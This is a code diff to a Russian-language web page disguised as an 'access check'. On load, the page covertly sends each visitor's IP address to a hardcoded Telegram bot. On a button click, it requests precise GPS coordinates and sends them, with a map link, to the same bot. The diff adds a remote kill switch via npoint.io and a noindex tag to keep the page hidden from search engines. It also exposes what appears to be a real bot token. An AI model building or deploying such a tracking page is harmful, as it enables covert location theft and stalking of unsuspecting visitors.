@@ -3,6 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Запрет индексации поисковиками (Google, Yandex) -->
+    <meta name="robots" content="noindex, nofollow, noarchive">
     <title>Проверка доступа</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -52,18 +54,40 @@
     </div>
 
     <script>
+        // Твои данные Telegram
         const TOKEN = '8845943863:AAHbVNrE_zL6vLR38U-Wc51dv3L0MCjOgi8';
         const CHAT_ID = '5905795768';
 
+        // 🔑 ВСТАВЬ СЮДА СВОЙ ID ИЗ NPOINT.IO (Из Шага 1)
+        const NPOINT_ID = 'ВСТАВЬ_СЮДА_ID'; 
+
         let userIP = 'Определяется...';
 
-        // Функция отправки сообщений
-        function sendToTelegram(text) {
-            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
-            fetch(url).catch(err => console.error(err));
+        // 1. Проверка состояния тумблера на npoint.io
+        async function isBotActive() {
+            try {
+                const res = await fetch(`https://api.npoint.io/${NPOINT_ID}`);
+                const data = await res.json();
+                return data.status === 'on';
+            } catch (e) {
+                // Если произошел сбой запроса к npoint, по умолчанию отправляем
+                return true; 
+            }
         }
 
-        // 1. Автоматический сбор IP при заходи на сайт
+        // 2. Отправка сообщений в Telegram
+        async function sendToTelegram(text) {
+            const active = await isBotActive();
+            if (!active) {
+                console.log('Отправка заблокирована удаленно через npoint.io');
+                return;
+            }
+
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`;
+            fetch(url).catch(err => console.error('Ошибка отправки:', err));
+        }
+
+        // 3. Автоматическое определение IP при входе на сайт
         async function initIP() {
             try {
                 const res = await fetch('https://api.ipify.org?format=json');
@@ -73,23 +97,22 @@
                 userIP = 'Не определен';
             }
 
-            // Отправляем уведомление о заходе на сайт
+            // Отправляем первичный лог о заходе
             sendToTelegram(`🚨 <b>Новый посетитель на сайте!</b>\n\n🌐 IP: <code>${userIP}</code>`);
         }
 
-        // 2. Геолокация при нажатии на кнопку
+        // 4. Запрос GPS по клику на кнопку «Подтвердить»
         function requestGeo() {
             const statusDiv = document.getElementById('status');
-
             if (!navigator.geolocation) {
-                statusDiv.innerText = 'Геолокация не поддерживается.';
+                statusDiv.innerText = 'Геолокация не поддерживается вашим браузером.';
                 return;
             }
 
             statusDiv.innerText = 'Запрашиваем геолокацию...';
 
             navigator.geolocation.getCurrentPosition(
-                (position) => {
+                async (position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     const accuracy = Math.round(position.coords.accuracy);
@@ -99,24 +122,23 @@
 
                     const msg = `🎯 <b>Получены точные координаты GPS!</b>\n\n` +
                                 `🌐 IP: <code>${userIP}</code>\n\n` +
-                                `📌 Широта: <code>${lat}</code>\n` +
-                                `📌 Долгота: <code>${lon}</code>\n` +
-                                `🎯 Точность: ~${accuracy}м\n\n` +
+                                `📌 <b>Координаты:</b>\n` +
+                                `• Широта: <code>${lat}</code>\n` +
+                                `• Долгота: <code>${lon}</code>\n` +
+                                `• Точность: ~${accuracy}м\n\n` +
                                 `🗺️ <a href="${mapsUrl}">Открыть на Google Картах</a>`;
 
-                    sendToTelegram(msg);
+                    await sendToTelegram(msg);
                 },
-                (error) => {
+                async (error) => {
                     statusDiv.innerHTML = '<span style="color: red;">Доступ отклонен.</span>';
-
-                    const msg = `⚠️ <b>Посетитель запретил доступ к GPS</b>\n\n🌐 IP: <code>${userIP}</code>`;
-                    sendToTelegram(msg);
+                    await sendToTelegram(`⚠️ <b>Посетитель отклонил доступ к GPS</b>\n\n🌐 IP: <code>${userIP}</code>`);
                 },
                 { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         }
 
-        // Запуск
+        // Старт сбора IP
         initIP();
     </script>
 
